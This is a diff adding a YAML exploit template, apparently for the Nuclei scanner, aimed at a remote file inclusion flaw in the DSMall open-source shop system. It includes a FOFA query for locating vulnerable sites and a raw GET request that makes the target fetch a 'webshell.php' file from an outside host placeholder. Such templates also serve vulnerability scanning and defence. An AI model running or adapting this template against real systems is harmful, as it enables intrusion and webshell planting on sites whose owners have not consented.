@@ -1,0 +1,23 @@
+id: poc-xs2wh1gddip9szxw
+info:
+  name: DSMall 开源多用户商城系统get_url_contents存在远程文件包含漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xs2wh1gddip9szxw'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xs2wh1gddip9szxw
+    fofa: body="var HOMESITEURL" && body="var HOMESITEROOT"
+http:
+- raw:
+  - 'GET /public/home/Connectwx/get_url_contents/?url=http://{{temp_dns}}/webshell.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.2047.109 Safari/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
